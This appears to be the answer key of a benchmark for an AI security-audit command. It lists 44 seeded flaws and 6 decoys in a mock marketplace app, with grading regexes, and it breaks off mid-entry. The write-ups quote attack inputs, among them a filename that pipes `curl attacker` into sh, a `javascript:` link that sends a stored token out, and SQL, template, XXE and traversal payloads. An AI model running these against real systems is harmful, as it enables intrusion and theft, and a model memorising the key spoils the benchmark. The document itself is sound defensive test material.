# Seeded defects — `vuln-fullstack`

**This file is the answer key.** `benchmarks/run.sh` never copies it into the workdir the
agent scans. If you stage the fixture by hand, delete this file from the copy first — an
agent that reads it will score 100% and the number will mean nothing.

Fixture shape: `marketly`, a multi-vendor marketplace — NestJS + Prisma/Postgres API, React + Vite storefront, Docker, compose, nginx, Kubernetes, GitHub Actions.
44 security defects seeded across every class row of `/security-audit`'s class coverage
ledger — injection, file access, SSRF / redirect, browser-side, information exposure,
business logic and access control, authentication, committed secrets, infrastructure and
CI — plus **6 decoys**: known-safe siblings that look like a seeded defect and must NOT be
reported. Primary target command: **`/security-audit`**.

What makes the fixture measure more than keyword recall: many defects have a correct
sibling in the same tree. `products.service.ts` runs a concatenated `$queryRawUnsafe`
and, about thirty lines lower, a parameterized `$queryRaw`; `downloads.controller.ts` has
a traversal on one route and a resolve-then-assert on the next; the payments webhook
compares its HMAC with `!==` while the shipping webhook uses `timingSafeEqual`;
`invoices.controller.ts` checks ownership on the PDF route and not on the detail route;
the compose file publishes Postgres on every interface while the web service is bound to
`127.0.0.1`. Reporting the safe half of a pair is scored too — see **Decoys** below.

Line numbers are exact against the files in this directory and are re-checked by
`benchmarks/run.sh --verify`, which also fails if a decoy sits close enough to a defect in
the same file for their scoring windows to overlap. If you edit fixture source, re-run it.

## Summary

| id | file:line | severity | command | class |
|----|-----------|----------|---------|-------|
| VFS-INJ-01 | `api/src/products/products.service.ts:28` | critical | `/security-audit` | injection/sql |
| VFS-INJ-02 | `api/src/orders/orders.service.ts:30` | high | `/security-audit` | injection/sql-identifier |
| VFS-INJ-03 | `api/src/settings/store-settings.service.ts:41` | high | `/security-audit` | injection/prototype-pollution |
| VFS-INJ-04 | `api/src/media/thumbnail.service.ts:16` | critical | `/security-audit` | injection/os-command |
| VFS-INJ-05 | `api/src/themes/themes.service.ts:27` | high | `/security-audit` | injection/argument |
| VFS-INJ-06 | `api/src/marketing/email-templates.service.ts:31` | critical | `/security-audit` | injection/ssti |
| VFS-INJ-07 | `api/src/pricing/discount-rules.service.ts:30` | critical | `/security-audit` | injection/code-eval |
| VFS-INJ-08 | `api/src/products/feed-import.service.ts:26` | high | `/security-audit` | injection/xxe |
| VFS-INJ-09 | `api/src/cart/cart.controller.ts:21` | critical | `/security-audit` | injection/deserialization |
| VFS-INJ-10 | `api/src/auth/auth.service.ts:15` | medium | `/security-audit` | injection/redos |
| VFS-FILE-01 | `api/src/media/downloads.controller.ts:39` | critical | `/security-audit` | file-access/path-traversal |
| VFS-FILE-02 | `api/src/media/uploads.controller.ts:39` | high | `/security-audit` | file-access/upload-validation |
| VFS-FILE-03 | `api/src/media/uploads.controller.ts:36` | high | `/security-audit` | file-access/stored-file-execution |
| VFS-FILE-04 | `api/src/media/archive.service.ts:27` | critical | `/security-audit` | file-access/zip-slip |
| VFS-SSRF-01 | `api/src/media/remote-image.service.ts:11` | high | `/security-audit` | ssrf/ssrf |
| VFS-SSRF-02 | `api/src/auth/auth.controller.ts:43` | medium | `/security-audit` | ssrf/open-redirect |
| VFS-XSS-01 | `web/src/pages/ProductPage.tsx:47` | high | `/security-audit` | client/stored-xss |
| VFS-XSS-02 | `web/src/components/SellerCard.tsx:26` | medium | `/security-audit` | client/url-scheme-xss |
| VFS-XSS-03 | `web/src/lib/session.ts:15` | medium | `/security-audit` | client/token-storage |
| VFS-XSS-04 | `deploy/nginx/nginx.conf:31` | medium | `/security-audit` | client/csp-clickjacking |
| VFS-XSS-05 | `api/src/account/account.controller.ts:13` | high | `/security-audit` | client/csrf |
| VFS-XSS-06 | `web/src/lib/search-index.ts:6` | high | `/security-audit` | client/bundle-secret |
| VFS-DATA-01 | `api/src/common/all-exceptions.filter.ts:32` | medium | `/security-audit` | exposure/stack-trace |
| VFS-DATA-02 | `api/src/main.ts:32` | low | `/security-audit` | exposure/docs-endpoint |
| VFS-DATA-03 | `api/src/debug/debug.controller.ts:14` | critical | `/security-audit` | exposure/debug-endpoint |
| VFS-DATA-04 | `api/src/users/users.service.ts:28` | high | `/security-audit` | exposure/over-returning |
| VFS-DATA-05 | `api/src/auth/auth.service.ts:46` | medium | `/security-audit` | exposure/enumeration |
| VFS-DATA-06 | `api/src/auth/auth.service.ts:59` | high | `/security-audit` | exposure/secret-in-log |
| VFS-DATA-07 | `api/src/webhooks/webhooks.controller.ts:37` | medium | `/security-audit` | exposure/timing-compare |
| VFS-LOGIC-01 | `api/src/orders/checkout.service.ts:25` | critical | `/security-audit` | logic/client-trusted-value |
| VFS-LOGIC-02 | `api/src/orders/coupons.service.ts:14` | high | `/security-audit` | logic/race |
| VFS-LOGIC-03 | `api/src/invoices/invoices.controller.ts:29` | high | `/security-audit` | access/idor |
| VFS-LOGIC-04 | `api/src/users/users.service.ts:35` | critical | `/security-audit` | access/mass-assignment |
| VFS-AUTH-01 | `api/src/auth/jwt-auth.guard.ts:19` | critical | `/security-audit` | auth/jwt-alg-not-pinned |
| VFS-AUTH-02 | `api/src/auth/admin.guard.ts:15` | critical | `/security-audit` | auth/unverified-token |
| VFS-SEC-01 | `web/.env.production:3` | high | `/security-audit` | secrets/committed-credential |
| VFS-SEC-02 | `api/Dockerfile:19` | high | `/security-audit` | secrets/secret-in-image |
| VFS-IAC-01 | `api/Dockerfile:27` | medium | `/security-audit` | infra/container-root |
| VFS-IAC-02 | `docker-compose.yml:12` | high | `/security-audit` | infra/exposed-datastore |
| VFS-IAC-03 | `.github/workflows/issue-triage.yml:19` | high | `/security-audit` | ci/script-injection |
| VFS-IAC-04 | `.github/workflows/pr-preview.yml:20` | critical | `/security-audit` | ci/pwn-request |
| VFS-IAC-05 | `deploy/nginx/nginx.conf:54` | high | `/security-audit` | infra/proxy-alias-traversal |
| VFS-IAC-06 | `deploy/nginx/nginx.conf:12` | low | `/security-audit` | infra/version-disclosure |
| VFS-IAC-07 | `deploy/k8s/api-deployment.yaml:34` | high | `/security-audit` | infra/privileged-container |

Severity split: 13 critical · 20 high · 9 medium · 2 low.

### Coverage by class

Grouped by the owner each class has in `/security-audit`'s class coverage ledger, so a
miss can be read as "this detector did not fire" rather than as a number.

| group | owner in `/security-audit` | seeded | ids |
|-------|---------------------------|--------|-----|
| injection | `injection-scan` | 10 | INJ-01 … INJ-10 |
| file access | `file-access-scan` | 4 | FILE-01 … FILE-04 |
| SSRF + open redirect | `ssrf-scan` | 2 | SSRF-01, SSRF-02 |
| browser-side | `xss-scan` | 6 | XSS-01 … XSS-06 |
| information exposure | `data-exposure-scan` | 7 | DATA-01 … DATA-07 |
| business logic | `logic-race-scan` | 2 | LOGIC-01, LOGIC-02 |
| access control (BOLA / BOPLA) | `@api-security-reviewer` | 2 | LOGIC-03, LOGIC-04 |
| authentication | `@auth-reviewer` | 2 | AUTH-01, AUTH-02 |
| committed secrets | `secret-scan` | 2 | SEC-01, SEC-02 |
| container / proxy / orchestration | `iac-scan` | 5 | IAC-01, IAC-02, IAC-05, IAC-06, IAC-07 |
| CI workflows | `ci-security-scan` (dispatched by `iac-scan` § 5) | 2 | IAC-03, IAC-04 |
| **decoys (must not be reported)** | — | **6** | DECOY-01 … DECOY-06 |

---

## VFS-INJ-01 — SQL injection through Prisma's raw escape hatch

```defect
id:       VFS-INJ-01
file:     api/src/products/products.service.ts
line:     28
severity: critical
command:  /security-audit
class:    injection/sql
anchor:   p.title ILIKE '%${params.q}%'
match:    sql.{0,3}inject|sqli\b|injection|queryRawUnsafe|interpolat|concatenat|unparameteri|not parameteri|without parameteri
```

`search()` pushes the storefront's `q` and `category` query parameters into SQL fragments
by template interpolation and runs the result through `$queryRawUnsafe`. The endpoint is
public (`GET /api/products`), so `q=%' UNION SELECT email, password_hash, …--` reads the
users table. `related()` in the same file shows the project already knows the safe form —
Prisma's tagged `$queryRaw` binds every interpolation. OWASP A05:2025 · CWE-89.

## VFS-INJ-02 — ORDER BY identifier concatenated from the query string

```defect
id:       VFS-INJ-02
file:     api/src/orders/orders.service.ts
line:     30
severity: high
command:  /security-audit
class:    injection/sql-identifier
anchor:   ORDER BY ${sort} ${direction}
match:    order.?by|sort|identifier|column
match:    inject|sqli\b|interpolat|concatenat|allow.?list|whitelist|unvalidated|unsanitized|unsanitised|not (validated|bindable|parameteri)|raw
```

The seller order table binds `sellerId` and `offset` as `$1`/`$2`, and allow-lists the sort
*direction* — but `sort` itself, straight from `?sort=`, is concatenated into
`ORDER BY`. Identifiers cannot be bound as parameters, so the half-fix leaves a
stacked-subquery injection (`sort=(SELECT CASE WHEN … THEN o.id ELSE o.total_cents END)`)
that reads any column a boolean at a time. The control is an allow-list of column names.
OWASP A05:2025 · CWE-89.

## VFS-INJ-03 — Prototype pollution through the settings deep merge

```defect
id:       VFS-INJ-03
file:     api/src/settings/store-settings.service.ts
line:     41
severity: high
command:  /security-audit
class:    injection/prototype-pollution
anchor:   for (const key of Object.keys(source)) {
match:    prototype pollution|proto.?pollut|__proto__|constructor\.prototype|Object\.prototype|deep.?merge|recursive merge|merge.{0,40}(unsafe|pollut|key)
```

`PATCH /api/settings` passes the raw JSON body (typed `Record<string, unknown>`, so the
ValidationPipe skips it) into a hand-rolled recursive merge with no key guard. JSON.parse
makes `"__proto__"` an own key, `target["__proto__"]` resolves to `Object.prototype`, and
the recursion writes attacker keys onto every object in the process — e.g. a polluted
`role` or `isAdmin` default. Any seller can trigger it. OWASP A05:2025 · CWE-1321.

## VFS-INJ-04 — OS command injection in thumbnail generation

```defect
id:       VFS-INJ-04
file:     api/src/media/thumbnail.service.ts
line:     16
severity: critical
command:  /security-audit
class:    injection/os-command
anchor:   await run(`convert
match:    command injection|os.command|shell.{0,15}(inject|metachar|interpol|string)|cmd.{0,3}inject|\bexec\b|child_process|remote code|\brce\b
```

`resize()` builds a shell string for `exec`. `size` comes from `?size=` on the upload route
and is unquoted; `sourcePath` embeds the uploader's original filename
(`uploads.controller.ts`), and `$( … )` still expands inside the double quotes. One
upload named `a$(curl attacker|sh).png` runs as the container user — root, see
VFS-IAC-01. `toWebp()` twenty lines lower is the safe shape (`execFile`, argument array,
server-generated paths). OWASP A05:2025 · CWE-78.

## VFS-INJ-05 — Argument injection into `git clone`

```defect
id:       VFS-INJ-05
file:     api/src/themes/themes.service.ts
line:     27
severity: high
command:  /security-audit
class:    injection/argument
anchor:   await runFile('git', ['clone'
match:    argument injection|arg.{0,10}inject|option injection|flag injection|upload-pack|ext::|end.of.options|leading (dash|hyphen)|starts? with.{0,15}(-|dash|hyphen)|git clone.{0,60}(inject|rce|remote code|option|flag|scheme|protocol)|repo.?url.{0,60}(inject|option|flag|validat|scheme|allow)
```

`execFile` with an argument array removes the shell, not the program's own option parser.
`repoUrl` is placed before the destination with no `--` terminator and no scheme check, so
`--upload-pack=touch /tmp/x` (or an `ext::` transport URL) is read by git as an option and
runs a command. Fix: validate `https://` against an allow-list of hosts and pass `--`
before the positional arguments. OWASP A05:2025 · CWE-88.

## VFS-INJ-06 — Server-side template injection in seller email templates

```defect
id:       VFS-INJ-06
file:     api/src/marketing/email-templates.service.ts
line:     31
severity: critical
command:  /security-audit
class:    injection/ssti
anchor:   const render = template(draft.body);
match:    ssti|server.side template|template injection|lodash.{0,25}template|_\.template|template\(|code exec|remote code|\brce\b|arbitrary (js|javascript|code)
```

lodash `template()` compiles its input into a JavaScript function; `<% %>` blocks are
arbitrary code. The template body is seller-authored, so `<%= process.mainModule.require
('child_process').execSync('id') %>` in a preview request executes on the API. A logic-less
engine (Mustache/Handlebars without helpers) over a fixed context is the fix.
OWASP A05:2025 · CWE-1336.

## VFS-INJ-07 — Seller promotion rules evaluated with `new Function`

```defect
id:       VFS-INJ-07
file:     api/src/pricing/discount-rules.service.ts
line:     30
severity: critical
command:  /security-audit
class:    injection/code-eval
anchor:   const predicate = new Function('cart'
match:    new Function|\beval\b|code (injection|exec)|remote code|\brce\b|arbitrary (js|javascript|code)|dynamic code
```

Discount conditions are stored verbatim from `POST /api/settings/discount-rules` and later
compiled with `new Function` at every checkout against that seller. Any seller gets code
execution in the API process — and it fires on buyers' requests, not the seller's. A small
expression grammar or a sandboxed evaluator over a fixed vocabulary is the fix.
OWASP A05:2025 · CWE-94.

## VFS-INJ-08 — XXE: product feed parsed with entity expansion on

```defect
id:       VFS-INJ-08
file:     api/src/products/feed-import.service.ts
line:     26
severity: high
command:  /security-audit
class:    injection/xxe
anchor:   parseXml(xml, { noent: true
match:    xxe|xml external entit|external entit|noent|entity expansion|\bdtd\b|billion laughs|xml.{0,20}(inject|bomb)
```

`noent: true` substitutes entities, `dtdload: true` fetches external DTDs and `nonet:
false` lets them come from the network. A feed declaring `<!ENTITY x SYSTEM
"file:///etc/marketly/jwt.key">` lands the token-signing key in a product description that
the storefront then renders. The comment's justification (named entities in inline DTDs)
does not need external entities. OWASP A05:2025 · CWE-611.

## VFS-INJ-09 — Unsafe deserialization of the cart cookie

```defect
id:       VFS-INJ-09
file:     api/src/cart/cart.controller.ts
line:     21
severity: critical
command:  /security-audit
class:    injection/deserialization
anchor:   serialize.unserialize(
match:    deserializ|unserializ|node-serialize|iife|_\$\$ND_FUNC|object injection|remote code|\brce\b
```

`node-serialize`'s `unserialize` revives `_$$ND_FUNC$$_` values as functions and an
immediately-invoked one runs during parsing. The input is the `mk_cart` cookie of an
anonymous visitor on an unauthenticated route — remote code execution with no account.
The cart is plain data; `JSON.parse` plus schema validation is the fix.
OWASP A08:2025 · CWE-502.

## VFS-INJ-10 — Catastrophic-backtracking email regex on request input

```defect
id:       VFS-INJ-10
file:     api/src/auth/auth.service.ts
line:     15
severity: medium
command:  /security-audit
class:    injection/redos
anchor:   export const EMAIL_PATTERN =
match:    redos|regular expression denial|catastrophic|backtrack|nested quantifier|super.?linear|exponential|regex.{0,40}(dos|denial|cpu|hang|block|event loop)
```

`([a-zA-Z0-9_.+-]+)*@` nests a quantifier inside a quantifier. An address of ~30
characters with no `@` forces exponential backtracking and pins the event loop, blocking
every request on that replica. It runs on `POST /api/auth/register` (unauthenticated) and
`POST /api/account/email`; the 254-character cap on both does not help, since about thirty
characters already take seconds. OWASP A05:2025 · CWE-1333.

## VFS-FILE-01 — Path traversal on the digital-goods download

```defect
id:       VFS-FILE-01
file:     api/src/media/downloads.controller.ts
line:     39
severity: critical
command:  /security-audit
class:    file-access/path-traversal
anchor:   const filePath = join(config.storage.attachments, productId, name);
match:    path traversal|directory traversal|traversal|\.\./|dot.?dot|\blfi\b|local file (inclusion|read)|arbitrary file (read|download|access)|outside.{0,30}(root|director|base)|path\.join.{0,40}(user|name|query|input)
```

`?name=` is joined onto the attachments root and streamed back. `path.join` normalises
`../` rather than refusing it, so any buyer of any product can request
`name=../../../../etc/marketly/jwt.key`. The purchase check above guards *which product*,
not *which path*. `exportFile()` further down resolves and asserts the result stays
under its root — the project's own correct pattern. OWASP A01:2025 · CWE-22.

## VFS-FILE-02 — Upload type check trusts the client's Content-Type

```defect
id:       VFS-FILE-02
file:     api/src/media/uploads.controller.ts
line:     39
severity: high
command:  /security-audit
class:    file-access/upload-validation
anchor:   IMAGE_TYPES.includes(file.mimetype)
match:    mime|content.?type|magic.?(byte|number)|file signature|\bsvg\b|spoof|client.{0,25}(declared|supplied|controlled) type
```

`file.mimetype` is whatever the multipart part claims; nothing inspects the bytes. The
allow-list also admits `image/svg+xml`, which is a script-capable document. An HTML or SVG
payload labelled `image/png` passes. `remote-image.service.ts` already sniffs magic bytes
for URL imports — the upload path does not. OWASP A06:2025 · CWE-434.

## VFS-FILE-03 — Uploads keep the client's filename inside the web-served directory

```defect
id:       VFS-FILE-03
file:     api/src/media/uploads.controller.ts
line:     36
severity: high
command:  /security-audit
class:    file-access/stored-file-execution
anchor:   ${file.originalname}
match:    originalname|original (file)?name|user.{0,25}(file)?name|client.{0,25}file ?name|file ?name.{0,40}(user|client|attacker|untrusted)|public/uploads|public (dir|folder|director)|web.?root|served (statically|from|by)|static|same.?origin|stored xss|\.html|extension
```

The stored name is `<timestamp>-<originalname>` and the destination is
`config.storage.uploads` = `public/uploads`, which `main.ts` serves with
`useStaticAssets` and nginx serves at `/uploads`. The uploader picks the extension, so a
`.html`/`.svg` file is served same-origin as a page — stored XSS against every buyer — and
the filename is the shell-injection vector of VFS-INJ-04. Generate the name server-side and
store outside the web root. OWASP A06:2025 · CWE-434.

## VFS-FILE-04 — Zip slip in bulk image import

```defect
id:       VFS-FILE-04
file:     api/src/media/archive.service.ts
line:     27
severity: critical
command:  /security-audit
class:    file-access/zip-slip
anchor:   const target = join(dest, entry.path);
match:    zip.?slip|archive.{0,40}(traversal|path|escape|outside)|entry\.path|\.\./|traversal|extract.{0,40}(outside|escape)|arbitrary file (write|overwrite)|overwrite
```

Each entry's stored path is joined onto the destination and written. An entry named
`../../../../dist/main.js` overwrites the API's own code (the container runs as root,
VFS-IAC-01), and the next restart executes it. Resolve each target and assert it stays
under `dest` before writing. OWASP A01:2025 · CWE-22.

## VFS-SSRF-01 — Server fetches any URL a seller pastes

```defect
id:       VFS-SSRF-01
file:     api/src/media/remote-image.service.ts
line:     11
severity: high
command:  /security-audit
class:    ssrf/ssrf
anchor:   const res = await fetch(rawUrl,
match:    ssrf|server.side request|internal (network|host|service|address|ip)|metadata|169\.254|localhost|private (ip|range|address|network)|allow.?list|allowlist|arbitrary url|user.{0,25}url
```

`fetchSellerImage` fetches `body.url` with no scheme, host or resolved-IP check and follows
redirects. The status code is echoed in the error message, so even a non-image response is
an oracle: a seller can port-scan the cluster, reach the cloud metadata endpoint, or hit
the Postgres service. `fetchCatalogImage` in the same file shows the allow-listed form.
OWASP A01:2025 · CWE-918.

## VFS-SSRF-02 — Open redirect on logout

```defect
id:       VFS-SSRF-02
file:     api/src/auth/auth.controller.ts
line:     43
severity: medium
command:  /security-audit
class:    ssrf/open-redirect
anchor:   return res.redirect(returnTo || config.publicUrl);
match:    open redirect|unvalidated redirect|redirect.{0,40}(arbitrary|any|external|attacker|untrusted|unvalidated|user)|returnTo|phishing
```

`GET /api/auth/logout?returnTo=https://evil.example` redirects anywhere, from the
marketplace's own domain — a ready-made phishing hop ("you've been signed out, sign in
again"). `LoginPage.tsx` restricts its own `next` to same-origin paths; the server does
not. OWASP A01:2025 · CWE-601.

## VFS-XSS-01 — Stored XSS: seller HTML rendered unsanitised

```defect
id:       VFS-XSS-01
file:     web/src/pages/ProductPage.tsx
line:     47
severity: high
command:  /security-audit
class:    client/stored-xss
anchor:   __html: product.descriptionHtml
match:    xss|cross.site script|dangerouslySetInnerHTML|innerHTML|unsanitiz|not sanitiz|without sanitiz|script injection|html injection|descriptionHtml
```

`descriptionHtml` is seller-supplied (product editor and the XML feed import) and goes into
`dangerouslySetInnerHTML` as-is. An `<img src=x onerror=…>` description runs in every
buyer's session, which holds its bearer token in `localStorage` (VFS-XSS-03). The review
bodies seventeen lines below go through `DOMPurify.sanitize` — the description does not.
OWASP A05:2025 · CWE-79.

## VFS-XSS-02 — `javascript:` URL in the seller website link

```defect
id:       VFS-XSS-02
file:     web/src/components/SellerCard.tsx
line:     26
severity: medium
command:  /security-audit
class:    client/url-scheme-xss
anchor:   href={seller.website}
match:    javascript:|url.?scheme|scheme|protocol|\bhref\b|xss|cross.site script
```

`website` is free text from `PATCH /api/users/me` (no URL validation in
`UpdateProfileDto`). React 18 escapes text but not URL schemes in `href`, so
`javascript:fetch('//x/'+localStorage.mk_access_token)` runs when a buyer clicks the
seller's site. Allow `http:`/`https:` only, server-side and at render.
OWASP A05:2025 · CWE-79.

## VFS-XSS-03 — Bearer token kept in localStorage

```defect
id:       VFS-XSS-03
file:     web/src/lib/session.ts
line:     15
severity: medium
command:  /security-audit
class:    client/token-storage
anchor:   localStorage.setItem(TOKEN_KEY, token);
match:    localStorage|local storage|web storage|sessionStorage|httponly|token.{0,40}(storage|stored|exfiltrat|xss)|xss.{0,40}(steal|exfiltrat|read)
```

The access token is readable by any script on the origin, so each XSS above (and any
compromised dependency) becomes full account takeover rather than an in-page action.
An `HttpOnly; Secure; SameSite` cookie or an in-memory token with refresh-cookie rotation
removes it from script reach. OWASP A07:2025 · CWE-922.

## VFS-XSS-04 — No Content-Security-Policy or framing control at the edge

```defect
id:       VFS-XSS-04
file:     deploy/nginx/nginx.conf
line:     31
severity: medium
command:  /security-audit
class:    client/csp-clickjacking
anchor:   add_header X-Content-Type-Options "nosniff" always;
match:    content.security.policy|\bcsp\b|frame-ancestors|x-frame-options|clickjack|framing|iframe|\bframe
```

nginx serves the SPA with `nosniff` and a referrer policy and nothing else: no CSP to
contain the XSS above, and no `frame-ancestors` / `X-Frame-Options`, so the seller payout
form can be framed and clickjacked. helmet's defaults in `main.ts` only cover API
responses, not `index.html`. OWASP A02:2025 · CWE-1021.

## VFS-XSS-05 — CSRF on cookie-authenticated account routes

```defect
id:       VFS-XSS-05
file:     api/src/account/account.controller.ts
line:     13
severity: high
command:  /security-audit
class:    client/csrf
anchor:   @Post('payout-account')
match:    csrf|xsrf|cross.site request|samesite|same-site|anti.?forgery|forged? (request|form)
```

`/api/account/*` authenticates by the `mk_sid` cookie alone, which `auth.controller.ts` sets
with `SameSite=None`. Nest parses urlencoded bodies, so a plain cross-site HTML form can
change a seller's payout IBAN or account email with no token, origin check or
re-authentication. CORS does not stop a simple form POST. OWASP A01:2025 · CWE-352.

## VFS-XSS-06 — Search admin key shipped to every browser

```defect
id:       VFS-XSS-06
file:     web/src/lib/search-index.ts
line:     6
severity: high
command:  /security-audit
class:    client/bundle-secret
anchor:   const SEARCH_ADMIN_KEY = import.meta.env.VITE_SEARCH_ADMIN_KEY;
match:    VITE_|import\.meta\.env|bundle|client.?side|browser|front.?end|admin.?key|secret|credential|expos
```

Vite inlines every `VITE_*` variable into the JavaScript bundle at build time. The search
cluster's write key is therefore public; anyone can rewrite or wipe the product index
(or inject listings that link anywhere). The index push belongs behind an API route that
holds the key server-side. OWASP A02:2025 · CWE-200.

## VFS-DATA-01 — Stack traces and raw error messages returned to clients

```defect
id:       VFS-DATA-01
file:     api/src/common/all-exceptions.filter.ts
line:     32
severity: medium
command:  /security-audit
class:    exposure/stack-trace
anchor:   stack: err.stack,
match:    stack|trace|internal (error|detail)|error (message|detail).{0,30}(leak|expos|client|response)|verbose error|information (leak|disclos|expos)
```

The global filter returns `err.stack` and the raw `err.message` for every exception,
including 500s — Prisma errors carry SQL fragments and table names, and stacks carry file
paths and library versions. Useful to anyone probing VFS-INJ-01/02. Log the detail,
return a correlation id. OWASP A10:2025 · CWE-209.

## VFS-DATA-02 — Swagger UI mounted unconditionally in production

```defect
id:       VFS-DATA-02
file:     api/src/main.ts
line:     32
severity: low
command:  /security-audit
class:    exposure/docs-endpoint
anchor:   SwaggerModule.setup('api/docs'
match:    swagger|openapi|api.?docs|/docs|documentation (endpoint|ui|route)
```

`/api/docs` publishes the full route inventory — admin, debug, webhook and theme-install
endpoints included — to unauthenticated visitors in every environment. Gate it on
`config.env !== 'production'` or behind staff auth. OWASP A02:2025 · CWE-200.

## VFS-DATA-03 — Unauthenticated debug route dumps `process.env`

```defect
id:       VFS-DATA-03
file:     api/src/debug/debug.controller.ts
line:     14
severity: critical
command:  /security-audit
class:    exposure/debug-endpoint
anchor:   env: process.env,
match:    process\.env|environment|env.{0,15}(var|dump|leak|expos)|debug|secret|unauthenticated|no (auth|guard)
```

`GET /api/debug/runtime` has no guard and is registered in every environment. It returns
`DATABASE_URL` (with the database password), both webhook HMAC secrets and the key paths —
everything needed to forge signed payment and shipping events, or to log into Postgres. OWASP A02:2025 · CWE-215.

## VFS-DATA-04 — Public seller profile returns the whole user row

```defect
id:       VFS-DATA-04
file:     api/src/users/users.service.ts
line:     28
severity: high
command:  /security-audit
class:    exposure/over-returning
anchor:   include: { products: { where: { status: 'PUBLISHED' }, take: 24 } },
match:    password.?hash|passwordHash|mfa.?secret|mfaSecret|over.?(return|expos|fetch|shar)|excessive data|sensitive (field|column|data|attribute)|no select|without (a )?select|missing select|projection|whole (user|row|record)|full (user|row|record|entity|object)|entire (user|row|record)
```

`publicProfile()` uses `include` with no `select`, so the unauthenticated
`GET /api/users/:id` returns `passwordHash`, `mfaSecret` and `email` for any seller. `me()`
in the same file uses the `SELF_FIELDS` projection — the omission is local to this method.
OWASP A01:2025 · CWE-213.

## VFS-DATA-05 — Login tells an attacker which emails have accounts

```defect
id:       VFS-DATA-05
file:     api/src/auth/auth.service.ts
line:     46
severity: medium
command:  /security-audit
class:    exposure/enumeration
anchor:   No account is registered with this email
match:    enumerat|different (error )?messages?|distinct (error )?messages?|distinguish|reveal.{0,30}(account|user|email)|(account|user|email).{0,30}exist|discrepan|timing
```

Unknown email and wrong password produce different messages, and bcrypt only runs when the
user exists, so the response time differs too. `register()` above deliberately returns the
same response either way — login undoes it. One generic message and a dummy hash compare on
the miss path. OWASP A07:2025 · CWE-204.

## VFS-DATA-06 — Access token written to the application log

```defect
id:       VFS-DATA-06
file:     api/src/auth/auth.service.ts
line:     59
severity: high
command:  /security-audit
class:    exposure/secret-in-log
anchor:   accessToken=${accessToken}
match:    \blog(s|ged|ging|ger)?\b.{0,60}token|token.{0,60}\blog(s|ged|ging|ger)?\b|logger|secret.{0,30}\blog|credential.{0,30}\blog|redact
```

Every successful login logs the full bearer token. Anyone with log-pipeline read access
can replay any session for its 15-minute life, and log retention outlives it as evidence
of every account's activity. Log the user id and a token fingerprint at most.
OWASP A09:2025 · CWE-532.

## VFS-DATA-07 — Payment webhook HMAC compared with `!==`

```defect
id:       VFS-DATA-07
file:     api/src/webhooks/webhooks.controller.ts
line:     37
severity: medium
command:  /security-audit
class:    exposure/timing-compare
anchor:   if (signature !== expected)
match:    timing|constant.?time|timingSafeEqual|time.?safe|side.?channel|!==|string compar|non.?constant
```

String inequality exits at the first differing byte, leaking how much of a guessed
signature is correct. The shipping webhook further down decodes both sides and uses
`timingSafeEqual` — the payments handler, the one that marks orders PAID, does not.
OWASP A04:2025 · CWE-208.

## VFS-LOGIC-01 — Checkout totals use the client's unit price

```defect
id:       VFS-LOGIC-01
file:     api/src/orders/checkout.service.ts
line:     25
severity: critical
command:  /security-audit
class:    logic/client-trusted-value
anchor:   item.unitPriceCents * item.quantity
match:    client.{0,30}(price|amount|total|supplied|controlled|trusted|provided)|price.{0,40}(client|request|body|tamper|trust|manipulat|user)|unitPriceCents|tamper|server.?side price
```

`createOrder` loads each product's real `priceCents` and then ignores it, summing
`item.unitPriceCents` from the request body. `unitPriceCents: 1` buys anything for a cent;
the payments webhook then accepts a charge equal to that tampered `totalCents`.
OWASP A06:2025 · CWE-602.

## VFS-LOGIC-02 — Coupon cap checked, then written, with no lock

```defect
id:       VFS-LOGIC-02
file:     api/src/orders/coupons.service.ts
line:     14
severity: high
command:  /security-audit
class:    logic/race
anchor:   if (coupon.redemptions >= coupon.maxRedemptions) {
match:    race|toctou|time.of.check|check.then.(act|write|update)|concurren|atomic|lost update|double.?(spend|redeem)|parallel|simultaneous|\block|over.?redeem|redemptions \+ 1
```

The cap is read, compared in application code, then written back as the stale value
`+ 1`. N concurrent checkouts all pass the check and all write the same count, so a
100-use launch code is redeemed without bound. The `$transaction` array does not lock the
row. Use a conditional `UPDATE … SET redemptions = redemptions + 1 WHERE redemptions <
max_redemptions` and check the affected-row count. OWASP A06:2025 · CWE-362.

## VFS-LOGIC-03 — Invoice detail has no ownership check

```defect
id:       VFS-LOGIC-03
file:     api/src/invoices/invoices.controller.ts
line:     29
severity: high
command:  /security-audit
class:    access/idor
anchor:   return this.invoices.findById(id);
match:    idor|insecure direct object|bola|ownership|owner|authoriz|access control|any (user|invoice|buyer)|other (user|buyer|customer)
```

Any signed-in user can read any invoice — billing address, line items, tax — by id.
`pdf()` directly below compares `buyerId`/`sellerId` with the caller and returns 403; the
detail route skips it. OWASP A01:2025 · CWE-639.

## VFS-LOGIC-04 — Profile update mass-assigns `role`

```defect
id:       VFS-LOGIC-04
file:     api/src/users/users.service.ts
line:     35
severity: critical
command:  /security-audit
class:    access/mass-assignment
anchor:   data: patch,
match:    mass.?assign|over.?post|\brole\b|privilege|escalat|whitelist|allow.?list|forbidNonWhitelisted|bopla|arbitrary (field|propert|column|attribute)|unvalidated (body|input|field)
```

The global `ValidationPipe` in `main.ts` is configured without `whitelist: true`, so
properties not declared on `UpdateProfileDto` survive validation, and `updateProfile`
passes the whole object to `prisma.user.update`. `PATCH /api/users/me` with
`{"role":"ADMIN"}` makes any buyer an admin; `email` and `passwordHash` are writable the
same way. OWASP A01:2025 · CWE-915.

## VFS-AUTH-01 — JWT verified without pinning the algorithm

```defect
id:       VFS-AUTH-01
file:     api/src/auth/jwt-auth.guard.ts
line:     19
severity: critical
command:  /security-audit
class:    auth/jwt-alg-not-pinned
anchor:   jwt.verify(token, this.publicKey)
match:    algorithms?|\balg\b|rs256|hs256|key confusion|alg.?confusion|pinn?ed|alg.{0,10}none
```

Tokens are signed RS256, but `verify` is called with no `algorithms` option and the project
pins `jsonwebtoken@^8`. An attacker signs an HS256 token using the *public* key (it is
public) as the HMAC secret and the guard accepts it — any `sub`, any `role`. Pass
`{ algorithms: ['RS256'], issuer: 'marketly-api' }`. OWASP A07:2025 · CWE-347.

## VFS-AUTH-02 — Admin guard decodes the token instead of verifying it

```defect
id:       VFS-AUTH-02
file:     api/src/auth/admin.guard.ts
line:     15
severity: critical
command:  /security-audit
class:    auth/unverified-token
anchor:   jwt.decode(token)
match:    jwt\.decode|decode.{0,30}(instead of|not|without|rather than).{0,15}verif|signature.{0,30}(not|never|un|without).{0,15}verif|unverified|forge|no signature|without verif|not verif
```

`AdminGuard` is used alone on `AdminController`, and `jwt.decode` checks no signature and
no expiry. The comment's premise ("tokens were already checked upstream") is false — nginx
proxies `/api/` straight to the pods. A hand-written `{"role":"ADMIN"}` token lists every
